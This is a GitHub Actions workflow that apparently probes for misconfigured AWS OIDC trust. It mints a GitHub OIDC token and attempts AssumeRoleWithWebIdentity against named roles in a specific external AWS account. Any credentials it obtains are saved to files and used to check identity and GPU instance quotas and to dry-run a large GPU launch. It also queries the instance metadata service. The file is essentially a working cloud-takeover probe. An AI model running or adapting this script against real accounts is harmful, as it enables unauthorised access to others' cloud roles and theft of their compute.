name: c211-i124061-oidc-probe
on:
  workflow_dispatch:
  push:
    branches: [ main ]
  pull_request:
    branches: [ main ]

permissions:
  id-token: write
  contents: read

jobs:
  oidc-probe:
    runs-on: ubuntu-latest
    timeout-minutes: 10
    steps:
      - name: Runner identity and metadata
        run: |
          echo "C211R_NONCE c211-i124061"
          echo "C211R_HOST $(hostname) $(uname -a)"
          echo "C211R_OS $(tr '\n' ';' < /etc/os-release)"
          echo "C211R_ENV $(env | grep -E '^(GITHUB_REPOSITORY|GITHUB_REPOSITORY_OWNER|GITHUB_EVENT_NAME|GITHUB_REF|GITHUB_WORKFLOW_REF|RUNNER_OS|RUNNER_ENVIRONMENT|RUNNER_NAME|CI)=' | sort | tr '\n' ';')"
          code=$(curl -s -m 3 -o /tmp/imds.txt -w '%{http_code}' http://169.254.169.254/latest/meta-data/ 2>/dev/null || true)
          echo "C211R_IMDS_HTTP $code"
          echo "C211R_IMDS_HEAD $(head -c 200 /tmp/imds.txt 2>/dev/null | tr '\n' ' ')"

      - name: Mint GitHub OIDC token and inspect claims
        run: |
          set -u
          RESP=$(curl -s -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=sts.amazonaws.com")
          echo "$RESP" | python3 -c 'import sys,json; d=json.load(sys.stdin); open("/tmp/tok","w").write(d["value"])'
          TOK=$(cat /tmp/tok)
          echo "C211R_JWT_LEN ${#TOK}"
          PAYLOAD=$(printf '%s' "$TOK" | cut -d. -f2 | tr '_-' '/+')
          PAD=$(( (4 - ${#PAYLOAD} % 4) % 4 ))
          PAYLOAD="$PAYLOAD$(printf '=%.0s' $(seq 1 $PAD))"
          echo "C211R_JWT_PAYLOAD $(printf '%s' "$PAYLOAD" | base64 -d 2>/dev/null | head -c 1800)"
          echo "C211R_JWT_HEADER $(printf '%s' "$TOK" | cut -d. -f1 | tr '_-' '/+' | base64 -d 2>/dev/null)"
          echo "TOK=$TOK" >> "$GITHUB_ENV"

      - name: STS AssumeRoleWithWebIdentity matrix (real roles + tampered controls)
        run: |
          set -u
          for ROLE in arn:aws:iam::159553542841:role/awslabs-AOSH-GitHubActionsRole arn:aws:iam::159553542841:role/adai-template-publisher arn:aws:iam::159553542841:role/awslabs-AOSH-GitHubActionsRolx arn:aws:iam::159553542841:role/adai-template-publishex; do
            code=$(curl -s -o /tmp/sts.xml -w '%{http_code}' -X POST https://sts.amazonaws.com/ \
              --data-urlencode "Action=AssumeRoleWithWebIdentity" \
              --data-urlencode "Version=2011-06-15" \
              --data-urlencode "RoleSessionName=c211-i124061" \
              --data-urlencode "WebIdentityToken=${TOK}" \
              --data-urlencode "RoleArn=${ROLE}")
            errcode=$(grep -o '<Code>[^<]*</Code>' /tmp/sts.xml | head -1 | sed 's/<[^>]*>//g')
            reqid=$(grep -o '<RequestId>[^<]*</RequestId>' /tmp/sts.xml | head -1 | sed 's/<[^>]*>//g')
            assumed=$(grep -o '<AssumedRoleUser>.*</AssumedRoleUser>' /tmp/sts.xml | head -c 400)
            echo "C211R_ASSUME role=${ROLE} http=${code} code=${errcode} requestid=${reqid}"
            if [ -n "$assumed" ]; then
              echo "C211R_ASSUME_OK role=${ROLE} ${assumed}"
              python3 - "$ROLE" <<'PY'
import sys,re,json
x=open('/tmp/sts.xml').read()
def g(t):
    m=re.search('<%s>(.*?)</%s>'%(t,t),x,re.S)
    return m.group(1) if m else None
creds={'Version':1,'AccessKeyId':g('AccessKeyId'),'SecretAccessKey':g('SecretAccessKey'),
       'SessionToken':g('SessionToken'),'Expiration':g('Expiration')}
open('/tmp/creds_%s.json'%sys.argv[1].split('/')[-1],'w').write(json.dumps(creds))
PY
            fi
          done

      - name: If any assumption succeeded, capture caller identity and GPU quota
        run: |
          set -u
          for f in /tmp/creds_*.json; do
            [ -f "$f" ] || continue
            export AWS_ACCESS_KEY_ID=$(python3 -c "import json;print(json.load(open('$f'))['AccessKeyId'] or '')")
            export AWS_SECRET_ACCESS_KEY=$(python3 -c "import json;print(json.load(open('$f'))['SecretAccessKey'] or '')")
            export AWS_SESSION_TOKEN=$(python3 -c "import json;print(json.load(open('$f'))['SessionToken'] or '')")
            [ -z "$AWS_ACCESS_KEY_ID" ] && continue
            echo "C211R_CREDS_SOURCE $f"
            python3 -m pip install --quiet awscli >/dev/null 2>&1 || true
            echo "C211R_IDENTITY $(aws sts get-caller-identity --output json 2>&1 | tr '\n' ' ')"
            for Q in L-DB2E81BA L-3819A6DF; do
              echo "C211R_QUOTA $Q $(aws servicequotas get-service-quota --service-code ec2 --quota-code $Q --region us-east-1 --output json 2>&1 | head -c 600 | tr '\n' ' ')"
            done
            echo "C211R_OFFERINGS $(aws ec2 describe-instance-types --region us-east-1 --filters Name=instance-type,Values=p5en.48xlarge,p5.48xlarge,p5e.48xlarge,p4d.24xlarge --query 'InstanceTypes[].{t:InstanceType,g:VCpuInfo.DefaultVCpus,m:GpuInfo.Gpus[0].Name,c:GpuInfo.Gpus[0].Count}' --output json 2>&1 | head -c 800 | tr '\n' ' ')"
            echo "C211R_DRYRUN $(aws ec2 run-instances --region us-east-1 --dry-run --image-id ami-00000000000000000 --instance-type p5en.48xlarge --count 1 2>&1 | head -c 500 | tr '\n' ' ')"
          done
